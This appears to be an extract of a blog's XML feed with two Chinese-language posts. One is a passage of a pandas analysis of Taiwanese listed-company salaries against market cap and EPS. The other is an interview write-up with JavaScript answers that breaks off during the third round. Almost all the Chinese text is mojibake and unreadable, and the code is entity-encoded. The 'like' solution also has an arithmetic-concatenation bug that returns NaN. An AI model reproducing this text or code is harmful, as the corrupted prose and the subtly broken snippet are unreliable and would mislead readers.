 å»å°ç£è‚¡å¸‚è³‡è¨Šç¶² å¼„ä¾†çš„å°ç£å‰ 20 å¤§å¸‚å€¼å…¬å¸åå–®ï¼š
 top20_valuable_stock_list = [2330, 2317, 6505, 2412, 1301, 3008, 1303, 1326, 2882, 2454, 1216, 2881, 2886, 2891, 2308, 2002, 3045, 2912, 3711, 2892]df_sii[df_sii[&#x27;company_code&#x27;].isin(top20_valuable_stock_list)]

 å—¯ï¼Œçœ‹ä¾†å…¬å¸å¸‚å€¼æ¯”è¼ƒé«˜ï¼Œè–ªæ°´ä¸ä¸€å®šæ¯”è¼ƒé«˜ã€‚
 å°è‚¡å‰äºŒåå¤§å¸‚å€¼å…¬å¸è–ªè³‡æ’è¡Œï¼šè¯ç™¼ç§‘ã€é´»æµ·ã€å°ç©é›»ã€ä¸­é‹¼ã€ä¸­è¯é›»ã€å°é”é›»ã€å…†è±é‡‘ã€å°å¡‘çŸ³åŒ–ã€å°å¡‘ã€å°åŒ– &lt;&#x3D; æŠ“åˆ°äº†ï¼Œå…¬å¸å¸‚å€¼å¤§è–ªè³‡åˆé«˜çš„å…¬å¸ï¼è®€è€…æº–å‚™ CV ä¸­ï¼ˆå¤§èª¤ï¼‰
 
 æœ€å¾Œä¾†é—œå¿ƒä¸€ä¸‹ï¼Œå’±å€‘ç¶²è·¯è»Ÿé«”æ¥­çš„è–ªè³‡æ°´å¹³å¥½äº†ã€‚è‹¥ä»¥ç´”ç¶²è·¯è»Ÿé«”å¯ä»¥çœ‹ä¸€ä¸‹ç›®å‰ç¨ç«‹å‡ºä¾†çš„ä¸Šå¸‚æ«ƒå…¬å¸çš„é›»å­å•†å‹™é¡åˆ¥ï¼š
 df_otc[df_otc[&#x27;industry&#x27;].isin([&#x27;é›»å­å•†å‹™&#x27;])].sort_values([&#x27;company_average_salary&#x27;], ascending=False)

 å¥½å§ï¼Œé©å‘½å°šæœªæˆåŠŸï¼ŒåŒå¿—ä»éœ€åŠªåŠ›ã€‚å°ç£åŠå°é«”ã€é›»å­æ¥­é‚„æ˜¯å¾ˆå¼·ï¼Œç¶²è·¯è»Ÿé«”æ¥­é‚„æ˜¯å¾—åŠ é»æ²¹ã€‚
 
 df_otc_ec = df_otc[df_otc[&#x27;industry&#x27;].isin([&#x27;é›»å­å•†å‹™&#x27;])]df_otc_ec.company_average_salary = pd.to_numeric(df_otc_ec.company_average_salary)df_otc_ec.loc[:, [&#x27;company_code&#x27;, &#x27;company_average_salary&#x27;]].plot(kind=&#x27;bar&#x27;, x=&#x27;company_code&#x27;, y=&#x27;company_average_salary&#x27;, title =&quot;TW EC&quot;, figsize=(15, 10), legend=True, fontsize=12)
 

EPS å’Œ è–ªè³‡çš„ç›¸é—œæ€§ï¼š æ¥è‘—æˆ‘å€‘æƒ³äº†è§£å…¬å¸è³ºéŒ¢æ˜¯å¦æœ‰åˆç†åˆ†é…åˆ°å“¡å·¥èº«ä¸Šï¼Œå› ç‚ºä¾ç…§æ­£å¸¸çš„é‚è¼¯å‡è¨­ä¾†è¬›ï¼Œå…¬å¸è³ºéŒ¢ï¼ˆé€™é‚Šç°¡å–®ç”¨ EPS æ¯è‚¡ç›ˆé¤˜ä¾†çœ‹ï¼Œç¨…å¾Œ EPS &#x3D; æ·¨åˆ©&#x2F;åœ¨å¤–æµé€šè‚¡æ•¸ï¼‰ï¼Œæ‡‰è©²å“¡å·¥çš„è–ªè³‡æœƒç›¸å°è¼ƒé«˜ï¼Œä½†çœŸçš„æ˜¯é€™æ¨£å—ï¼Ÿ
 åœ¨ç•«æ•£ä½ˆåœ–ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆæŠŠ dataFrame å–å­é›†åˆï¼ˆåƒ…å«å…¬å¸å¹³å‡è–ªè³‡å’Œå…¬å¸ epsï¼‰
 df_sii_average_salary_eps = df_sii[[&#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;]]

 sort ç™¼ç¾æœ‰ å¤§ç«‹å…‰ã€åœ‹å·¨ã€è¯æ–°ç§‘ index [488, 252, 372] é€™å¹¾å€‹ eps è¶…é«˜çš„ outlinerï¼Œç°¡å–®èµ·è¦‹å…ˆæŠŠå®ƒå€‘å»é™¤ï¼š
 df_sii_average_salary_eps.sort_values([&#x27;company_eps&#x27;], ascending=False)

 
 filter_df_sii_average_salary_eps = df_sii_average_salary_eps.drop(df_sii_average_salary_eps.index[[488, 252, 372]])filter_df_sii_average_salary_eps.sort_values([&#x27;company_eps&#x27;], ascending=False)

 çœ‹èµ·ä¾†æ­£å¸¸å¤šäº†ï¼š
 
 å°‡ company_eps ç•¶ä½œ x è»¸ï¼Œcompany_average_salary ç•¶ y è»¸ç•«å‡º scatterï¼Œçœ‹èµ·ä¾†å¤§éƒ¨åˆ†å…¬å¸ eps éƒ½åœ¨ 0-10 ä¹‹é–“ï¼Œä½† eps å’Œè–ªè³‡ç›¸é—œæ€§çœ‹èµ·ä¾†æ²’è¾¦æ³•å¾ˆç¢ºå®šæ˜¯å¦ç›¸é—œï¼š
 filter_df_sii_average_salary_eps.plot(kind=&#x27;scatter&#x27;, x=&#x27;company_eps&#x27;, y=&#x27;company_average_salary&#x27;)

 
 ä½¿ç”¨ Pearson correlation coefficient ä¾†çœ‹çœ‹ eps å’Œè–ªè³‡çš„ç›¸é—œç¨‹åº¦ï¼š

çš®çˆ¾æ£®ç›¸é—œåˆ†æç”¨æ–¼æ¢è¨å…©é€£çºŒè®Šæ•¸ (X, Y) ä¹‹é–“çš„ç·šæ€§ç›¸é—œæ€§ï¼Œè‹¥å…©è®Šæ•¸ä¹‹é–“çš„ç›¸é—œä¿‚æ•¸çµ•å°å€¼è¼ƒå¤§ï¼Œå‰‡è¡¨ç¤ºå½¼æ­¤ç›¸äº’å…±è®Šçš„ç¨‹åº¦è¼ƒå¤§ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œè‹¥å…©è®Šæ•¸ä¹‹é–“ç‚ºæ­£ç›¸é—œï¼Œå‰‡ç•¶ X æå‡æ™‚ï¼ŒY ä¹Ÿæœƒéš¨ä¹‹æå‡ï¼›åä¹‹ï¼Œè‹¥å…©è®Šæ•¸ä¹‹é–“ç‚ºè² ç›¸é—œï¼Œå‰‡ç•¶ X æå‡æ™‚ï¼ŒY ä¹Ÿæœƒéš¨ä¹‹ä¸‹é™ã€‚ä¸€èˆ¬ç ”ç©¶å­¸è€…èªç‚ºï¼Œç›¸é—œä¿‚æ•¸ 0.3 ä»¥ä¸‹ç‚ºä½ç›¸é—œï¼Œ0.3-0.7 ç‚ºä¸­ç­‰ç›¸é—œï¼Œ0.7 ä»¥ä¸Šç‚ºé«˜åº¦ç›¸é—œã€‚

 filter_df_sii_average_salary_eps.corr(method =&#x27;pearson&#x27;)

 
 çµæœæ˜¯ 0.307071ã€‚æ‰€ä»¥å°ç£ä¸Šå¸‚å…¬å¸ eps å’Œå…¬å¸è–ªè³‡æ‡‰è©²å¯ä»¥ç®—æ˜¯ä¸­ç­‰ç›¸é—œï¼Œä¹Ÿå°±æ˜¯èªªå…¬å¸è³ºéŒ¢å’Œä½ è³ºä¸è³ºéŒ¢ä¸ä¸€å®šé«˜åº¦ç›¸é—œï¼Œé‚„è¦çœ‹è€é—†ç”¢æ¥­å’Œè€é—†æ‘³ä¸æ‘³é–€å‘€ï¼

å…¬å¸ç¶“ç‡Ÿç¸¾æ•ˆèˆ‡å“¡å·¥è–ªé…¬ä¹‹é—œè¯æ€§åŠåˆç†æ€§èªªæ˜ï¼š é€™æ¬¡è­‰äº¤æ‰€å…¬å¸ƒçš„å…¬é–‹è³‡æ–™è »æœ‰è¶£çš„ï¼Œç‰¹åˆ¥è¦æ±‚è‹¥æ˜¯å±¬æ–¼ä½è–ªçš„å…¬å¸éœ€è¦å…¬å¸ƒä½è–ªç†ç”±ã€‚è‹¥æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥ç ”ç©¶çœ‹çœ‹ï¼Œå¯ä»¥æ‹“å±•è¦–é‡ï¼Œé–‹äº†ä¸å°‘çœ¼ç•ŒXDï¼Œä¹Ÿæ›´åŠ å°è­‰äº†ï¼š
 é«˜è–ªçš„ç†ç”±åªæœ‰ä¸€å€‹ï¼ˆç”¢æ¥­ã€å…¬å¸è³ºéŒ¢ç™¼å¤§è²¡ï¼‰ï¼Œä½è–ªçš„ç†ç”±å»å¯ä»¥æœ‰å¾ˆå¤šç¨®ã€‚

æœ¬å…¬å¸åœ°è™•åé„‰ï¼Œäººæ‰è¦æ±‚ä¸æ˜“è‡´å¤–ç±å“¡å·¥äººæ•¸è¼ƒé«˜æ‹‰ä½å¹³å‡è–ªè³‡ï¼Œä¸”å°å€‹äººçš„å­¸ç¶“æ­·åŠæŠ€èƒ½è¦æ±‚ç„¡æ³•æé«˜ï¼Œåƒ…èƒ½æ–¼å°±è·éç¨‹ä¸­äºˆä»¥è¨“ç·´åŠåŸ¹é¤Šï¼Œé›–ç„¡æ³•é”åˆ°è¦å®šé‡‘é¡ä»ç›¡åŠ›æé«˜å“¡å·¥æ‰€å¾—ã€‚

 ç‚ºä½•å¤–ç±å“¡å·¥åªèƒ½ä½è–ªï¼Ÿå¯ä»¥é›‡ç”¨é«˜ç´šæŠ€è¡“å“¡å·¥ï¼Ÿ

1.å…¨çƒç¶“æ¿Ÿä¸æ™¯æ°£2.éåº¦æ•™è‚²è®“å­¸æ­·è²¶å€¼ã€åŒå„•æ•ˆæ‡‰ä½¿è–ªè³‡éä½3.å¤–å‹äººæ•¸å¤šï¼Œæ‹‰ä½å¹³å‡è–ªè³‡4.æ´¾é£å“¡å·¥çš„æ¯”ä¾‹é«˜ï¼Œæ‹‰ä½å°å“¡å·¥å¹³å‡è–ªè³‡çš„æˆé•·

 éåº¦æ•™è‚²è®“å­¸æ­·è²¶å€¼ï¼Ÿå…¨çƒç¶“æ¿Ÿä¸æ™¯æ°£ï¼Ÿï¼ˆåƒéŒ¯è¬éŒ¯éƒ½æ˜¯åˆ¥äººçš„éŒ¯ï¼Ÿé»‘äººå•è™Ÿï¼Ÿï¼‰

å› ç¸½å…¬å¸åº§è½åœ¨ã€Œæ–°ç«¹ç§‘å­¸åœ’å€ã€å¤–ï¼Œç›¸è¼ƒè–ªè³‡æ°´æº–èˆ‡åœ’å€å…§çš„åŒæ¥­è¼ƒä½ã€‚ä¸”å…¬å¸å¤§éƒ¨ä»½å“¡å·¥æ˜¯åœ¨åœ°å±…æ°‘ï¼Œæ‰€ä»¥è–ªè³‡ç¦åˆ©é …ç›®å±¬æ–¼å¤–ç¸£å¸‚ä¹‹äº¤é€šã€ä½å®¿è£œåŠ©ç¦åˆ©è¼ƒå°‘ã€‚

 æ–°ç«¹ç§‘å­¸åœ’å€ OSï¼šä½è–ªæ€ªæˆ‘å›‰ï½


ç¸½çµä»¥ä¸Šæˆ‘å€‘é€éç°¡å–®ä½¿ç”¨ Python è³‡æ–™åˆ†æå’Œè¦–è¦ºåŒ–ä¸Šå¸‚æ«ƒå…¬å¸è–ªæ°´å…¬é–‹è³‡æ–™ï¼Œé€²è¡Œè³‡æ–™åˆ†æçš„æ­¥é©Ÿï¼š

è³‡æ–™è’é›† Data Collect &#x2F; Data Scraping
è³‡æ–™å‰è™•ç† Data Preprocessing
æ¢ç´¢æ€§è³‡æ–™åˆ†æ Explore Data Analytics

ä¸»è¦æ˜¯é€éä¸€å€‹é›£å¾—çš„å…¬é–‹è³‡æ–™é›†é€²è¡Œç°¡å–®çš„è³‡æ–™åˆ†æï¼ˆæ”¿åºœéƒ¨é–€å¾·æ”¿æ‡‰è©²å¥½å¥½çš„é¼“å‹µä¸€ä¸‹ï¼Œä¹ŸæœŸè¨±è‡ªå·±æœªä¾†æœ‰æ©Ÿæœƒä¹Ÿä¸è¦æˆç‚ºå“¡å·¥å£ä¸­çš„æ…£è€é—†ï¼Ÿï¼‰ã€‚æœªä¾†æˆ‘å€‘ä¹Ÿå¯ä»¥æ›´é€²ä¸€æ­¥æ•´åˆæ›´å¤šè³‡æ–™é›†ä¾†é€²è¡Œé¸è‚¡ã€å…¬å¸ä½è–ªç†ç”±æ–‡å­—åˆ†ææˆ–æ˜¯åˆ†æå„å€åŸŸçš„è–ªè³‡åœ°åœ–ç­‰æ›´å¤šæœ‰è¶£çš„è³‡æ–™åˆ†ææ‡‰ç”¨ã€‚æˆ‘å€‘ä¸‹å›è¦‹å•¦ï¼
åƒè€ƒæ–‡ä»¶
è­‰äº¤æ‰€å…¬å¸ƒæœ¬åœ‹ä¸Šå¸‚å…¬å¸107å¹´åº¦éæ“”ä»»ä¸»ç®¡è·å‹™ä¹‹å…¨æ™‚å“¡å·¥è–ªè³‡è³‡è¨Š
å°ç£å…¬å¸ç¸½å¸‚å€¼
çš®çˆ¾æ£®ç©å·®ç›¸é—œåˆ†æ(Pearson Correlation)-èªªæ˜èˆ‡SPSSæ“ä½œ

ï¼ˆimage via twimgã€topjavatutorialã€Hacker Noon
ï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Data Analytics</tag>
        <tag>Data Visualization</tag>
        <tag>make a fortune</tag>
        <tag>pandas</tag>
        <tag>ä¸Šå¸‚æ«ƒè–ªè³‡è³‡æ–™</tag>
        <tag>å…¬é–‹è³‡è¨Šè§€æ¸¬ç«™</tag>
        <tag>å°ç£è–ªè³‡</tag>
        <tag>å°ç£è–ªæ°´</tag>
        <tag>salary</tag>
        <tag>python è³‡æ–™åˆ†æ</tag>
        <tag>python è³‡æ–™è¦–è¦ºåŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>è¨˜ä¸€æ¬¡è»Ÿé«”å·¥ç¨‹å¸«é¢è©¦å¿ƒå¾—</title>
    <url>/2017/01/27/interview-review/</url>
    <content><![CDATA[å‰è¨€æˆ‘è‡ªå·±å¾ˆå–œæ­¡çœ‹ä¸€äº›é¢è©¦çš„æ–‡ç« ï¼Œå› ç‚ºå¯ä»¥å¾è£¡é¢å­¸åˆ°è¨±å¤šï¼Œå¦‚æœæœ‰é¢è©¦é¡Œç›®çš„è©±é‚£å°±æ›´æ£’äº†ï¼Œå¯ä»¥é‚Šçœ‹é‚Šæƒ³ï¼Œæ¸¬æ¸¬çœ‹è‡ªå·±çš„å¯¦åŠ›ã€‚é€™ç¯‡æ–‡ç« æ˜¯æˆ‘å‰ä¸€é™£å­é¢è©¦æŸé–“å…¬å¸çš„æ­·ç¨‹è·Ÿä¸€äº›å¿ƒå¾—ï¼Œå¸Œæœ›å°å¤§å®¶æœƒæœ‰å¹«åŠ©ã€‚é †å¸¶ä¸€æï¼Œæœ€å¾Œæ˜¯æœ‰æ‹¿åˆ° offer çš„ã€‚
æˆ‘é¢è©¦çš„è·ç¼ºå«åš Software Engineerï¼Œè»Ÿé«”å·¥ç¨‹å¸«ï¼Œå››æ¬¡é¢è©¦éƒ½æ˜¯ä¸­æ–‡çš„ï¼ˆæˆ‘åŸæœ¬ä»¥ç‚ºæœƒæœ‰è‹±æ–‡ï¼‰ã€‚HR æœ‰å…ˆè·Ÿæˆ‘èŠéï¼Œæˆ‘æœ‰èªªæˆ‘æ¯”è¼ƒæƒ³è¦åšå‰ç«¯ï¼Œæ‰€ä»¥æœ‰äº›é¢è©¦çš„è€ƒé¡Œæœƒæ¯”è¼ƒåå‰ç«¯ã€‚ä½†å› ç‚ºé€™é–“å…¬å¸ä¹Ÿå¾ˆæ³¨é‡ CS çš„åŸºç¤ï¼Œæ‰€ä»¥ä¾ç„¶æœƒæœ‰å¾ˆå¤šè³‡å·¥æœ¬ç§‘çš„å•é¡Œã€‚ï¼ˆä½œæ¥­ç³»çµ±ã€è³‡æ–™åº«ã€è³‡æ–™çµæ§‹èˆ‡æ¼”ç®—æ³•ç­‰ç­‰ï¼‰
å› ç‚ºå…¬å¸ä¸åœ¨å°ç£ï¼Œæ‰€ä»¥é¢è©¦çš„å½¢å¼éƒ½æ˜¯æ¡ç”¨ Skype è¦–è¨ŠåŠ ä¸ŠæŸå€‹ç·šä¸Š coding çš„ç¶²ç«™ã€‚ç¾åœ¨å¾ˆå¤šå…¬å¸çš„é ç«¯é¢è©¦éƒ½å¾ˆå–œæ­¡æ¡ç”¨é€™ç¨®å½¢å¼ï¼Œå°±æ˜¯å‡ºé¡Œç›®çµ¦ä½ è®“ä½ å³æ™‚ codingï¼Œé¢è©¦å®˜é‚£é‚Šçœ‹å¾—åˆ°ä½ æ‰“å­—ï¼ˆå°±è·Ÿ hackpad æˆ–æ˜¯ Google docs ä¸€æ¨£ï¼‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ compile çœ‹çœ‹ç­”æ¡ˆå°ä¸å°ã€‚
ä¸€é¢ä¸€é¢çš„é¢è©¦å®˜æ˜¯å€‹å‰ç«¯å·¥ç¨‹å¸«ï¼Œæ‰€ä»¥å•é¡Œæœƒæ¯”è¼ƒåå‰ç«¯ã€‚ç¨‹å¼èªè¨€çš„éƒ¨åˆ†æˆ‘æ˜¯é¸æ“‡ç”¨ JavaScript ä¾†ä½œç­”ã€‚
ç¬¬ä¸€é¡Œåœ¨ Facebook ä¸Šé¢ï¼Œå°æ–¼æŒ‰è®šé€™å€‹åŠŸèƒ½ï¼Œé€šå¸¸æœƒæœ‰ä»¥ä¸‹å¹¾ç¨®æè¿°ï¼š

åªæœ‰ä¸€å€‹äººæŒ‰è®šï¼šA likes this
æœ‰å…©å€‹äººæŒ‰è®šï¼šA and B like this
æœ‰ä¸‰å€‹äººæŒ‰è®šï¼šA, B and C like this
æœ‰å››å€‹äººä»¥ä¸ŠæŒ‰è®šï¼šA, B and 2 others like this

å¯«ä¸€å€‹ functionï¼Œæœƒçµ¦ä½ ä¸€å€‹å«åš names çš„é™£åˆ—ï¼Œæ ¹æ“š names è¼¸å‡ºçµæœã€‚
é€™ä¸€é¡Œå¾ˆåŸºæœ¬ï¼Œæˆ‘è¦ºå¾—ä¸»è¦æ˜¯æƒ³çœ‹ä½ æœƒæ€éº¼è§£æ±ºé€™å€‹å•é¡Œï¼Œä»¥åŠè®“ä½ å°è©¦èº«æ‰‹ä¸€ä¸‹ï¼ˆæ€•ä½ å¤ªç·Šå¼µï¼‰ã€‚æˆ‘è‡ªå·±çš„è©±æ˜¯ç›´æ¥å¯« ifâ€¦else å»åˆ¤æ–·ã€‚
å¦å¤–ï¼Œè¨˜å¾—æŠŠä¸€äº› edge case ä¹Ÿè€ƒæ…®ä¸€ä¸‹ï¼Œä¾‹å¦‚èªª names æœ‰å¯èƒ½æ˜¯ç©ºé™£åˆ—å—ï¼Ÿå¦‚æœæ˜¯çš„è©±æ‡‰è©²è¼¸å‡ºä»€éº¼ï¼Ÿ
function like(names) &#123;    var output = &quot; likes this&quot;;    if(names.length&lt;=0) return &quot;&quot;;    if(names.length===1) &#123;        return names[0] + output;    &#125;        output = &quot; like this&quot;;    if(names.length==2) &#123;        return names[0] + &quot; and &quot; + names[1] + output;    &#125;    if(names.length==3) &#123;        return names[0] + &quot;, &quot; + names[1] + &quot; and &quot; + names[2] + output;    &#125;    return names[0] + &quot;, &quot; + names[1] + &quot; and &quot; + names.length-2 + &quot; others&quot; + output;&#125;

ç¬¬äºŒé¡Œå¹« array åŠ ä¸€å€‹ any çš„ functionï¼Œå¯ä»¥è¼¸å…¥ä»»ä¸€ functionï¼Œå¦‚æœä»»ä½•ä¸€å€‹å…ƒç´ ä¸Ÿé€²é‚£ function è£¡é¢çš„å€¼æ˜¯ trueï¼Œå°±è¼¸å‡º trueï¼Œå¦å‰‡å°± falseã€‚
ä¾‹å¦‚èªªç¾åœ¨æœ‰å€‹ function å«åšï¼šisGreaterThanZeroï¼Œç¯„ä¾‹å°±æœƒæ˜¯é€™æ¨£ï¼š
[1, 2, 3, 4, 5].any(isGreaterThanZero); //=&gt; true[-1, 0].any(isGreaterThanZero); //=&gt; false

é€™é¡Œæ‡‰è©²ä¸»è¦æ˜¯è€ƒæœƒä¸æœƒç”¨ Array.prototype ä¾†æ–°å¢å‡½å¼ä¸Šå»ï¼Œå¦‚æœæœƒçš„è©±ï¼Œå¯¦ä½œçš„éƒ¨åˆ†å‰‡æ²’æœ‰ä»€éº¼é›£åº¦ã€‚ä¸€æ¨£é™„ä¸Šæˆ‘çš„è§£ç­”ï¼š
Array.prototype.any = function(func)&#123;    var len = this.length;    for(var i=0; i&lt;len; i++) &#123;      if(func(this[i])) return true;    &#125;    return false;&#125;


ç¬¬ä¸‰é¡Œå°æ–¼é€™ä¸€è¡Œç¨‹å¼ç¢¼ï¼švar MyObject = new MyClass();å¯ä»¥è©¦è‘—è¬›è¬›çœ‹èƒŒå¾Œåšäº†ä»€éº¼äº‹å—ï¼Ÿæœ‰æ²’æœ‰å¯èƒ½ä¸ç”¨ new ä½†æ˜¯å»é”æˆä¸€æ¨£çš„æ•ˆæœï¼Ÿ
é€™ä¸€é¡Œæˆ‘ç­”çš„é —å·®çš„ï¼Œä¸»è¦æ˜¯è€ƒå° JavaScript prototype æ©Ÿåˆ¶çš„ç†è§£ç¨‹åº¦ï¼Œæƒ³ç­è§£æ›´å¤šçš„å¯ä»¥åƒè€ƒï¼šJavaScript èªè¨€æ ¸å¿ƒï¼ˆ15ï¼‰å‡½å¼ prototype ç‰¹æ€§ã€‚
ç¬¬å››é¡Œæœ‰äº›å¾ˆæ…¢çš„ functionï¼Œæˆ‘å€‘æƒ³æŠŠå®ƒ cache èµ·ä¾†ï¼Œä¸‹æ¬¡åŸ·è¡Œæ™‚å°±ä¸æœƒé‚£éº¼æ…¢ï¼Œä¾‹å¦‚èªªï¼š
complexFunction(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10scomplexFunction(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10svar ccf = cache(complexFunction);ccf(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10sccf(&#x27;a&#x27;, &#x27;b&#x27;); // Instant
å¯«å‡ºä¸€å€‹ cache çš„ functionï¼Œå¯ä»¥æŠŠå‚³é€²ä¾†çš„ function åŠ ä¸Š cache åŠŸèƒ½
é€™ä¸€é¡Œå…¶å¯¦è€ƒçš„é»æ»¿å¤šçš„ï¼Œç¬¬ä¸€å€‹æ˜¯è€ƒä½ æœƒä¸æœƒå›å‚³ä¸€å€‹ functionï¼ˆé›–ç„¶é€™ä¹Ÿæ»¿åŸºæœ¬çš„å•¦ï¼‰ï¼Œç¬¬äºŒå€‹æ˜¯è€ƒä½ çŸ¥ä¸çŸ¥é“æ€éº¼åš deep equalã€‚
å› ç‚ºä»–ç¯„ä¾‹çµ¦çš„æ˜¯å…©å€‹å­—ä¸²ï¼Œæ‰€ä»¥ä¹çœ‹ä¹‹ä¸‹å¥½åƒä¸æ˜¯å¾ˆé›£ï¼Œä½†å†è¿½å•ä¸‹å»ï¼Œå°±æœƒçŸ¥é“æ‡‰è©²è¦å¯«å‡ºä¸€å€‹èƒ½å¤  cache æ‰€æœ‰åƒæ•¸çš„ç‰ˆæœ¬ï¼Œæ„æ€å°±æ˜¯å¦‚æœåƒæ•¸æ˜¯ Object çš„è©±ä¹Ÿæ‡‰è©²èƒ½åš cacheã€‚æ‰€ä»¥å°±è¦ç´€éŒ„åƒæ•¸è·Ÿè¼¸å‡ºçš„çµ„åˆï¼Œå»æŸ¥ä¸€ä¸‹æœ‰æ²’æœ‰å·²ç¶“ç®—éçš„åƒæ•¸ï¼Œæœ‰çš„è©±å°±ç›´æ¥è¼¸å‡ºçµæœã€‚
é€™é¡Œæˆ‘è¦ºå¾—è¦åšåˆ°å®Œç¾çš„è©±å…¶å¯¦ä¹ŸæŒºé›£çš„ï¼Œå¯ä»¥å†å„ªåŒ–çš„é»æ‡‰è©²å¾ˆå¤šã€‚
æˆ‘æœ€å¾Œå®Œæˆçš„ä¸å®Œç¾çš„ç‰ˆæœ¬ï¼š
function cache(func) &#123;    var cached = [];        function deepEqual(obj1, obj2) &#123;        var obj1Type = typeof obj1;        var obj2Type = typeof obj2;        if(obj1Type !== obj2Type) &#123;          return false;        &#125;                // same type        if(obj1Type!==&#x27;object&#x27;) &#123;          return obj1===obj2;        &#125;                // object        for(var key in obj1)&#123;            if(!obj2[key])&#123;              return false;            &#125;            // have the same key            if(!deepEqual(obj1[key], obj2[key]))&#123;                return false;            &#125;        &#125;        return true;    &#125;        return function()&#123;        var isCached = false;        var cacheResult = null;                for(var i=0; i&lt;cached.length; i++)&#123;            if( deepEqual(cached[i].arguments, arguments) ) &#123;                isCached = true;                cacheResult = cached[i].result;                break;            &#125;        &#125;                if(isCached) &#123;            return cacheResult;        &#125; else &#123;            var result = func.apply(null, arguments);            cached.push(&#123;              arguments: arguments,              result: result              &#125;)            return result;        &#125;    &#125;&#125;

ç¬¬äº”é¡Œç”¨ CSS å¯¦ç¾ä¸€å€‹å¾ˆç°¡å–®çš„ç¶²æ ¼ç³»çµ±ï¼Œå‡è¨­ä¸€è¡Œæœ‰ 12 æ ¼å¥½äº†ï¼Œè«‹å•åƒæ˜¯col-4é€™ç¨® class çš„ CSS æ‡‰è©²æ€éº¼å¯«ï¼Ÿ
å› ç‚ºæˆ‘ CSS åŸæœ¬å°±æ¯”è¼ƒå¼±ï¼Œæ‰€ä»¥é‚„æ»¿æ€•ç¢°åˆ° CSS å•é¡Œï¼Œä¹Ÿæ²’æœ‰è‡ªå·±å¯¦ä½œéç¶²æ ¼ç³»çµ±ã€‚æ‰€ä»¥é€™ä¸€é¡Œæˆ‘å°±ç­”èªªï¼šdisplay: inline-block; width: 25%ã€‚
å¾Œä¾†å°±è¢«æç¤ºèªªï¼Œæ¦‚å¿µå·®ä¸å¤šï¼Œå¯æ˜¯å¯¦ä½œä¸Šæœƒç¢°åˆ°ä¸€äº›å•é¡Œï¼Œå› ç‚ºé è¨­æœƒæœ‰ marginï¼Œæ‰€ä»¥å››å€‹é›–ç„¶çœ‹èµ·ä¾†æœƒæ’æ»¿ï¼Œä½†å…¶å¯¦æœƒæ’æˆå…©è¡Œã€‚è¦å†åŠ ä¸Šä¸€äº›ä¿®æ­£æ‰è¡Œã€‚
ä¸€é¢å·®ä¸å¤šå°±åˆ°é€™é‚ŠçµæŸäº†ï¼Œå•çš„éƒ½æ˜¯ä¸€äº›åŸºæœ¬çš„ JavaScript è·Ÿ CSS çš„é¡Œç›®ï¼Œæˆ‘è¦ºå¾—æ²’æœ‰ç‰¹åˆ¥å›°é›£çš„ã€‚æ‰€ä»¥æˆ‘è‡ªå·±è¦ºå¾—ä¸€é¢çš„è¡¨ç¾ç®—æ˜¯é‚„ä¸éŒ¯å•¦ã€‚
äºŒé¢è€ƒçš„å•é¡Œéƒ½æ˜¯ä¸€äº›æ¯”è¼ƒåè³‡å·¥æœ¬ç§‘ç³»çš„å•é¡Œäº†ï¼Œå•é¡Œå¤§è‡´å¦‚ä¸‹ï¼š

tcp é€£ç·šæ™‚æœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œé‚£é—œé–‰æ™‚å€™çš„æµç¨‹æ˜¯ä»€éº¼ï¼ˆè€ƒä½ å››æ¬¡æ®æ‰‹çš„æµç¨‹ï¼‰
æœ‰å¯«é linux ä¸Šçš„ç¨‹å¼å—ï¼ˆæ‡‰è©²æ˜¯è€ƒä½ æœ‰æ²’æœ‰å¯«éç³»çµ±ç¨‹å¼ï¼‰
thread è·Ÿ process çš„å·®åˆ¥ï¼ˆç¶“å…¸è€ƒé¡Œï¼‰
mysql çš„ index æœ‰å“ªäº›ï¼Œå·®åœ¨å“ªï¼Ÿï¼ˆè€ƒå°è³‡æ–™åº«çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼‰
hashmap æ€éº¼å¯¦ç¾ï¼ˆè€ƒè³‡æ–™çµæ§‹ï¼‰
virtual memory åœ¨å¹¹å˜›ï¼ˆè€ƒä½œæ¥­ç³»çµ±ï¼‰
è³‡æ–™åº«æ¬„ä½ TEXT è·Ÿ VARCHAR å·®ç•°ï¼ˆè€ƒè³‡æ–™åº«ï¼‰

å¯ä»¥çœ‹åˆ°è€ƒé¡Œé‚„æ»¿å»£çš„ï¼Œç¶²è·¯ã€ç³»çµ±ç¨‹å¼ã€ä½œæ¥­ç³»çµ±ã€è³‡æ–™åº«ã€è³‡æ–™çµæ§‹å…¨éƒ¨éƒ½æœ‰å•åˆ°ã€‚é€™é‚Šæ˜¯æˆ‘çš„å¼±é …ï¼Œæ‰€ä»¥éƒ½ç­”å¾—æ»¿å·®çš„â€¦
ä¸‰é¢åŸæœ¬ä»¥ç‚ºäºŒé¢å®Œå°±æ°æ°äº†ï¼Œä½†æˆ‘è‡ªå·±çŒœæ¸¬å› ç‚ºæˆ‘ä¸€é¢çš„è¡¨ç¾é‚„ä¸éŒ¯ï¼Œç¶œåˆèµ·ä¾†é‚„æ˜¯é€²åˆ°äº†ç¬¬ä¸‰é¢ã€‚çµæœç¬¬ä¸‰é¢è€ƒçš„ä¾èˆŠæ˜¯æˆ‘ä¸å¤ªåœ¨è¡Œçš„éƒ¨åˆ†ã€‚
ç¬¬ä¸‰é¢æˆ‘æœ‰å°è±¡çš„é¡Œç›®åªæœ‰ä¸€é¡Œè€Œå·²ï¼Œè€ƒå®Œä¹‹å¾Œä¸Šç¶²æŸ¥äº†ä¸€ä¸‹ç™¼ç¾ä¹Ÿæ˜¯æ»¿ç¶“å…¸çš„é¡Œç›®ã€‚
